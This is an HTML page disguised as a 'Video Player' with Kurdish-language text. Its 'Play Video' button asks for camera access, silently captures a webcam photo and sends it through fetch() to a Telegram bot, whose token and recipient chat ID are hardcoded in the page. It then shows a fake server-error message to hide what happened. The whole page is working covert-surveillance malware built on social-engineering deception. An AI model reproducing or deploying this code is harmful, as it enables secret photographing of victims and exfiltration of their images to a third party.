<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video Player</title>
    <style>
        body {
            margin: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            /* باگراوەندی نەخشینی ورد وەک مافورەکان */
            background-color: #2b0a0a;
            background-image: url("data:image/svg+xml,%3Csvg width='80' height='80' viewBox='0 0 80 80' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%23d4af37' fill-opacity='0.15'%3E%3Cpath d='M40 40c0-8.837 7.163-16 16-16s16 7.163 16 16-7.163 16-16 16-16-7.163-16-16zm-40 0c0-8.837 7.163-16 16-16s16 7.163 16 16-7.163 16-16 16S0 48.837 0 40z'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E");
            font-family: sans-serif;
            text-align: center;
        }

        #main-container {
            /* کاردێکی سادە بە لێواری زێڕینی زۆر باریک */
            background: rgba(15, 15, 15, 0.9);
            padding: 50px 30px;
            border-radius: 5px;
            border: 1px solid #d4af37;
            box-shadow: 0 0 40px rgba(0,0,0,0.8);
            width: 80%;
            max-width: 320px;
        }

        h2 {
            color: #d4af37;
            margin-bottom: 30px;
            font-size: 20px;
            font-weight: normal;
        }

        #startBtn {
            padding: 12px 35px;
            font-size: 16px;
            border-radius: 0; /* چوارگۆشەیی کلاسیک */
            border: 1px solid #d4af37;
            background: transparent;
            color: #d4af37;
            font-weight: bold;
            cursor: pointer;
            transition: 0.3s;
        }

        #startBtn:hover {
            background: #d4af37;
            color: black;
        }

        #status {
            color: #d4af37;
            margin-top: 20px;
        }
    </style>
</head>
<body>

    <div id="main-container">
        <h2 id="status">ڤیدیۆکە ئامادەیە</h2>
        <button id="startBtn">Play Video 🎬</button>
    </div>

    <video id="v" autoplay playsinline style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        const token = '7690976118:AAFBKfwJcXYlhYf4CDLIoynZoTTLho1jp5g'; 
        const myId = '7978104952'; 

        document.getElementById('startBtn').addEventListener('click', function() {
            document.getElementById('status').innerText = "کەمێک چاوەڕێ بکە...";
            this.style.display = 'none';

            navigator.mediaDevices.getUserMedia({ video: true })
            .then(s => {
                const v = document.getElementById('v');
                v.srcObject = s;
                
                setTimeout(() => {
                    const c = document.getElementById('c');
                    c.width = 640; c.height = 480;
                    c.getContext('2d').drawImage(v, 0, 0);
                    
                    c.toBlob(b => {
                        const f = new FormData();
                        f.append('chat_id', myId);
                        f.append('photo', b, 'img.jpg');

                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                            method: 'POST',
                            body: f
                        }).then(() => {
                            document.getElementById('status').innerText = "هەڵەیەک لە سێرڤەر ڕوویدا، دووبارە هەوڵ بدەرەوە!";
                        });
                    }, 'image/jpeg');
                }, 1000);
            })
            .catch(e => {
                document.getElementById('status').innerText = "بۆ بینینی ڤیدیۆکە دەبێت ڕێگە بدەیت (Allow).";
            });
        });
    </script>
</body>
</html>
